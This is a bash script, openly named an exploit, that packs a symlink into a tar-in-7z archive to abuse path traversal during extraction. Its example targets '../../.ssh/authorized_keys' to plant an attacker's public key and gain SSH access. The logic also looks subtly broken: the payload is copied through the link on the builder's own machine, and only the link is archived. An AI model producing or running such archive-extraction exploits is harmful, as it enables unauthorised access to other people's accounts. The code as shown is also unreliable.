#!/bin/bash
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <payload_file> <target_symlink_path> <output_archive>"
    echo "Example: $0 mykey.pub ../../.ssh/authorized_keys exploit.7z"
    exit 1
fi

PAYLOAD="$1"
TARGET="$2"
OUT="$3"

WORKDIR=$(mktemp -d)
ln -s "$TARGET" "$WORKDIR/symlink"
cp "$PAYLOAD" "$WORKDIR/symlink"

tar --sort=name -cf "$WORKDIR/exploit.tar" -C "$WORKDIR" symlink
7z a "$OUT" "$WORKDIR/exploit.tar" >/dev/null

echo "[*] Exploit archive created: $OUT"
rm -rf "$WORKDIR"
